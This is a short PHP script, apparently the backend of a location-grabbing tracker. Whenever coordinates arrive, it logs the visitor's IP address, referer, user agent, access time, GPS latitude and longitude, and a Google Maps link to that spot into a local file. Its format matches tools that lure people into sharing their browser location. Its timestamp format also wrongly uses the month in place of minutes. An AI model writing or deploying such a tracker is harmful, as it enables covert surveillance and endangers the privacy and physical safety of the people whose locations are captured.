<?php
	if(isset($_REQUEST['coords'])) {
		require("settings.php");
		date_default_timezone_set($timezone);
		$refer     = $_SERVER['HTTP_REFERER']; // previsous link
		$ip        = $_SERVER['REMOTE_ADDR']; // ip address
		$ua        = $_SERVER['HTTP_USER_AGENT']; // info browser yang dipakai
		$timestamp = date("h:m:s d-m-Y"); // waktu akses
		$latitude  = $_REQUEST['coords']['latitude'];
		$longitude = $_REQUEST['coords']['longitude'];
		// Generate Model
		$info = "=========================================\n";
		$info.= "IP Address: ".$ip."\n";
		$info.= "Refer Link: ".$refer."\n";
		$info.= "User Agent: ".$ua."\n";
		$info.= "Time Access: ".$timestamp."\n";
		$info.= "Location: {latitude=".$latitude.";longitude=".$longitude."}\n";
		$info.= "Link: https://www.google.co.id/maps/@".$latitude.",".$longitude.",20z\n";
		$info.= "=========================================\n";
		// Generate File
		$berkas = fopen($fileStore, 'a');
		fwrite($berkas, $info);
		fclose($berkas);
	};
?>